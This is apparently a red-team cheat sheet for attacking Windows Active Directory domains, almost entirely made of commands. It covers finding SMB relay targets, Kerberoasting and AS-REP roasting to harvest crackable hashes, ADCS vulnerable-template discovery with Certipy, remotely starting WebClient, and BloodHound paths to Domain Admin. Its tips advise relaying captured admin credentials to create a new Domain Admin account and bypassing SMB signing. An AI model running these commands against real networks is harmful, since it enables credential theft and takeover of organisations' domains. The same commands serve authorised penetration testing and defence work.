Network & SMB Survey
# SMB signing check — find relay targets (signing OFF = can relay) nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt nxc smb 192.168.1.0/24 -u user -p 'Password1' --shares # Check IPv6 (mitm6 needs this enabled — it usually is by default) nxc smb DC_IP -u user -p 'Password1' -M ipv6 # Check spooler service (PrinterBug coercion) nxc smb 192.168.1.0/24 -u user -p 'Password1' -M spooler # Machine Account Quota — if > 0 you can add machine accounts nxc ldap DC_IP -u user -p 'Password1' -M maq # NTLMv1 check (if in use, hashes can be cracked via crack.sh) nxc smb 192.168.1.0/24 -u user -p 'Password1' --ntlm-timeout 1
LDAP / NetExec Full Enum
# Full domain dump python3 ldapdomaindump.py -u 'domain\user' -p Password1 DC_IP -o /tmp/lddump/ # Key checks nxc ldap DC_IP -u user -p Password1 --users nxc ldap DC_IP -u user -p Password1 -M maq # MAQ > 0 = can add machines nxc ldap DC_IP -u user -p Password1 -M adcs # ADCS present? nxc ldap DC_IP -u user -p Password1 -M laps # LAPS enabled? nxc ldap DC_IP -u user -p Password1 -M ldap-checker # LDAP signing enforced? nxc ldap DC_IP -u user -p Password1 --trusted-for-delegation # Unconstrained deleg nxc ldap DC_IP -u user -p Password1 --password-not-required # AS-REP candidates # Kerberoastable SPNs impacket-GetUserSPNs domain.local/user:Password1 -dc-ip DC_IP -request -outputfile kerberoast.txt # AS-REP roastable impacket-GetNPUsers domain.local/user:Password1 -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt # Delegation impacket-findDelegation domain/user:Password1 -dc-ip DC_IP
Responder Analyze (No Poisoning)
# Run in ANALYZE mode first — watch without poisoning responder -I eth0 -A # Check what's coming: LLMNR, NBT-NS, MDNS, WPAD? # Look for: Domain Admin accounts querying — that's gold # Check LDAP signing/channel binding nxc ldap DC_IP -u user -p Password1 -M ldap-checker

💡 Analyze FirstIf you see DA accounts in Responder analyze mode, relay those creds to LDAPS to create a new DA account.

WebClient Service Detection
# Check which hosts have WebClient (WebDAV) running nxc smb 192.168.1.0/24 -u user -p Password1 -M webdav # Start WebClient on target remotely nxc smb TARGET -u user -p Password1 -M webdav -o ACTION=start # Check WPAD config nxc smb DC_IP -u user -p Password1 -M wpad

💡 Key InsightWebClient = HTTP auth, not SMB. HTTP creds can be relayed to LDAP even when SMB signing is fully enforced. This bypasses hardened SMB environments.

ADCS Enumeration (Certipy)
# Full ADCS enum certipy find -u user@domain.local -p Password1 -dc-ip DC_IP -stdout # Save results certipy find -u user@domain.local -p Password1 -dc-ip DC_IP -text -output certipy_results # Vulnerable templates only (ESC1-8) certipy find -u user@domain.local -p Password1 -dc-ip DC_IP -vulnerable -stdout # Check CA HTTP enrollment (ESC8) curl -k http://CA_IP/certsrv/
BloodHound Collection
# Python-based (stealthy) bloodhound-python -u user -p Password1 -d domain.local -ns DC_IP -c All # Or RustHound (faster) rusthound -d domain.local -u user@domain.local -p Password1 -i DC_IP -o /tmp/bh/ # Key BH queries after import: # → Shortest Path to Domain Admins # → Find Principals with DCSync Rights # → Kerberoastable Users with path to DA # → Computers where DA users have sessions # → Owned to DA (mark user as Owned first) # ACL enum (PowerView) Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights

💡 BloodHound TipMark your compromised user as "Owned" and run Transitive Object Control. Nested ACLs often give unexpected DA paths.
